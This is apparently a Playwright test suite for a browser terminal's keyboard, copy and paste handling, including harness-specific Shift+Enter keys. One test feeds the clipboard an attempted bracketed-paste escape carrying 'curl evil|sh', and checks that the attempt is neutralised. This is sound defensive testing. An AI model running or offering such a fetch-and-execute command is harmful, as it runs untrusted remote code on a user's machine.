import { expect, test } from "@playwright/test";

for (const backend of ["native", "herdr"] as const) {
  test.describe(backend + " terminal input", () => {
    let inputs: Buffer[];
    let connections: number;
    let writeOutput: (text: string) => void;

    test.beforeEach(async ({ page, context }) => {
      inputs = [];
      connections = 0;
      await context.grantPermissions(["clipboard-read", "clipboard-write"]);
      if (backend === "native") {
        await page.routeWebSocket("**/api/terminal/native?*", (socket) => {
          connections++;
          writeOutput = (text) => socket.send(Buffer.from(text));
          socket.send(JSON.stringify({ type: "history", bytes: 0 }));
          socket.send(Buffer.from("\x1b[2J\x1b[HSELECTABLE\r\n\x1b[?2004h"));
          socket.onMessage((data) => { if (typeof data !== "string") inputs.push(data); });
        });
      } else {
        await page.addInitScript(() => {
          const originalFetch = window.fetch;
          window.fetch = (resource, options) => {
            if (resource === "/api/terminal/stream") {
              const body = JSON.parse(String(options?.body));
              const encoder = new TextEncoder();
              return Promise.resolve(new Response(new ReadableStream({ start(controller) {
                controller.enqueue(encoder.encode(JSON.stringify({ type: "terminal.ready", lease: body.control ? "sized" : "observed", identity: "proof" }) + "\n"));
                controller.enqueue(encoder.encode(JSON.stringify({ type: "terminal.frame", encoding: "ansi", seq: 1, full: true, width: 80, height: 24, bytes: btoa("\x1b[2J\x1b[HSELECTABLE\r\n\x1b[?2004h") }) + "\n"));
                options?.signal?.addEventListener("abort", () => controller.close(), { once: true });
              } })));
            }
            return originalFetch(resource, options);
          };
        });
        await page.route("**/api/terminal/input", async (route) => {
          const { command, seq } = route.request().postDataJSON();
          if (command.type === "terminal.input") inputs.push(Buffer.from(command.text));
          await route.fulfill({ json: { seq } });
        });
        await page.route("**/api/terminal/history", (route) => route.fulfill({ json: { text: "SELECTABLE", agent: "codex" } }));
      }
      await page.goto("/tests/fixtures/terminal-input.html#" + backend);
      await expect(page.getByText("Connecting", { exact: true })).toHaveCount(0);
      await expect(page.getByText("Connecting to the terminal", { exact: true })).toHaveCount(0);
      await page.getByRole("textbox", { name: "Terminal input", exact: true }).focus();
    });

    test("editing, navigation, modifiers and interrupt reach the program", async ({ page }) => {
      for (const [key, expected] of [
      ["Control+c", "\x03"], ["Escape", "\x1b"], ["Tab", "\t"], ["Shift+Tab", "\x1b[Z"],
      ["Enter", "\r"], ["Shift+Enter", "\r"],
      ["ArrowUp", "\x1b[A"], ["ArrowDown", "\x1b[B"], ["ArrowRight", "\x1b[C"], ["ArrowLeft", "\x1b[D"],
      ["Home", "\x1b[H"], ["End", "\x1b[F"], ["PageUp", "\x1b[5~"], ["PageDown", "\x1b[6~"],
      ["Control+a", "\x01"], ["Control+e", "\x05"], ["Control+u", "\x15"], ["Control+k", "\x0b"],
      ["Control+w", "\x17"], ["Control+l", "\x0c"], ["Control+r", "\x12"], ["Control+d", "\x04"], ["Control+z", "\x1a"],
      ["Alt+b", "\x1bb"], ["Alt+ArrowLeft", "\x1b[1;3D"],
      ]) {
        inputs.length = 0;
        await page.keyboard.press(key);
        await expect.poll(() => Buffer.concat(inputs).toString("utf8"), { message: key }).toBe(expected);
        expect(await page.locator("body").getAttribute("data-escaped")).toBeNull();
      }
    });

    for (const key of ["Control+c", "Control+Shift+c"]) {
      test(key + " copies a selection without interrupting", async ({ page }) => {
        await page.locator(".terminal-surface:not(.away) .xterm-screen").first().dblclick({ position: { x: 35, y: 12 } });
        await page.evaluate(() => navigator.clipboard.writeText(""));
        await page.keyboard.press(key);
        await expect.poll(() => page.evaluate(() => navigator.clipboard.readText())).toBe("SELECTABLE");
        expect(Buffer.concat(inputs).toString("utf8")).toBe("");
        await page.evaluate(() => navigator.clipboard.writeText(""));
        await page.keyboard.press("Control+c");
        if (key === "Control+c") {
          await expect.poll(() => Buffer.concat(inputs).toString("utf8")).toBe("\x03");
        } else {
          await expect.poll(() => page.evaluate(() => navigator.clipboard.readText())).toBe("SELECTABLE");
          expect(Buffer.concat(inputs).toString("utf8")).toBe("");
        }
      });
    }

    for (const key of ["Control+v", "Control+Shift+v"]) {
      for (const [size, text] of [["small", "one\ntwo"], ["large", "first\n" + "🙂界".repeat(14000) + "\nlast"]]) {
        test(key + " pastes " + size + " Unicode text once and in order", async ({ page }) => {
          await page.evaluate((value) => navigator.clipboard.writeText(value), text);
          await page.keyboard.press(key);
          await expect.poll(() => Buffer.concat(inputs).toString("utf8")).toBe("\x1b[200~" + text.replaceAll("\n", "\r") + "\x1b[201~");
        });
      }
    }

    for (const [key, expected] of [["Control+v", ""], ["Control+Shift+v", ""]]) {
      test(key + " with only an image on the clipboard sends " + (expected ? "SYN as xterm does" : "nothing"), async ({ page }) => {
        await page.evaluate(async () => {
          const canvas = document.createElement("canvas");
          const image = await new Promise<Blob | null>((resolve) => canvas.toBlob(resolve, "image/png"));
          if (!image) throw new Error("no image");
          await navigator.clipboard.write([new ClipboardItem({ "image/png": image })]);
        });
        await page.keyboard.press(key);
        await page.keyboard.press("x");
        await expect.poll(() => Buffer.concat(inputs).toString("utf8")).toBe(expected + "x");
      });
    }

    test("the browser context-menu paste event uses the same clipboard path", async ({ page }) => {
      await page.getByRole("textbox", { name: "Terminal input", exact: true }).evaluate((element) => {
        const clipboardData = new DataTransfer();
        clipboardData.setData("text/plain", "context\r\nmenu");
        element.dispatchEvent(new ClipboardEvent("paste", { clipboardData, bubbles: true, cancelable: true }));
      });
      await expect.poll(() => Buffer.concat(inputs).toString("utf8")).toBe("\x1b[200~context\rmenu\x1b[201~");
    });

    test("pasted text cannot end the paste early and type the rest as keys", async ({ page }) => {
      await page.evaluate(() => navigator.clipboard.writeText("\x1b[20\x1b[201~1~\ncurl evil|sh\n日本🙂"));
      await page.keyboard.press("Control+v");
      await expect.poll(() => Buffer.concat(inputs).toString("utf8")).toBe("\x1b[200~[201~\rcurl evil|sh\r日本🙂\x1b[201~");
    });

    if (backend === "native") {
      for (const role of ["cfo", "goblin"]) {
        for (const [harness, expected] of [
          ["claude", "\n"],
          ["codex", "\x1b[74;36;10;1;8;1_\x1b[74;36;10;0;8;1_"],
          ["bash", "\r"], ["powershell", "\r"], ["pi", "\r"], ["", "\r"],
        ]) {
          test("Shift+Enter uses the composer key for " + role + " " + (harness || "unknown harness"), async ({ page }) => {
            await page.goto("/tests/fixtures/terminal-input.html?" + new URLSearchParams({ harness, role }) + "#native");
            await expect(page.getByText("Connecting to the terminal", { exact: true })).toHaveCount(0);
            await page.getByRole("textbox", { name: "Terminal input", exact: true }).focus();
            inputs.length = 0;
            await page.keyboard.press("Shift+Enter");
            await expect.poll(() => Buffer.concat(inputs).toString("utf8")).toBe(expected);
            inputs.length = 0;
            await page.keyboard.press("Enter");
            await expect.poll(() => Buffer.concat(inputs).toString("utf8")).toBe("\r");
          });
        }
      }

      for (const role of ["cfo", "goblin"]) {
        for (const [harness, expected] of [["claude", "\n"], ["codex", "\x1b[74;36;10;1;8;1_\x1b[74;36;10;0;8;1_"]]) {
          test("a hook reporting " + harness + " changes the " + role + " Shift+Enter key without reconnecting", async ({ page }) => {
            connections = 0;
            await page.goto("/tests/fixtures/terminal-input.html?" + new URLSearchParams({ role }) + "#native");
            await expect(page.getByText("Connecting to the terminal", { exact: true })).toHaveCount(0);
            await page.getByRole("textbox", { name: "Terminal input", exact: true }).focus();
            inputs.length = 0;
            await page.keyboard.press("Shift+Enter");
            await expect.poll(() => Buffer.concat(inputs).toString("utf8")).toBe("\r");

            await page.evaluate((value) => (window as unknown as { reportHarness: (harness: string) => void }).reportHarness(value), harness);
            inputs.length = 0;
            await page.keyboard.press("Shift+Enter");

            await expect.poll(() => Buffer.concat(inputs).toString("utf8")).toBe(expected);
            expect(connections).toBe(1);
          });
        }
      }

      test("selected Ctrl+C still copies when the program has taken the mouse", async ({ page }) => {
        writeOutput("\x1b[?1000h\x1b[?1006h");
        await page.keyboard.down("Shift");
        await page.locator(".terminal-surface .xterm-screen").first().dblclick({ position: { x: 35, y: 12 } });
        await page.keyboard.up("Shift");
        await page.evaluate(() => navigator.clipboard.writeText(""));
        await page.keyboard.press("Control+c");
        await expect.poll(() => page.evaluate(() => navigator.clipboard.readText())).toBe("SELECTABLE");
        expect(Buffer.concat(inputs).toString("utf8")).toBe("");
      });

      test("paste stops using brackets when the program turns that mode off", async ({ page }) => {
        writeOutput("\x1b[?2004l");
        await page.evaluate(() => navigator.clipboard.writeText("plain\npaste"));
        await page.keyboard.press("Control+v");
        await expect.poll(() => Buffer.concat(inputs).toString("utf8")).toBe("plain\rpaste");
      });
    }
  });
}
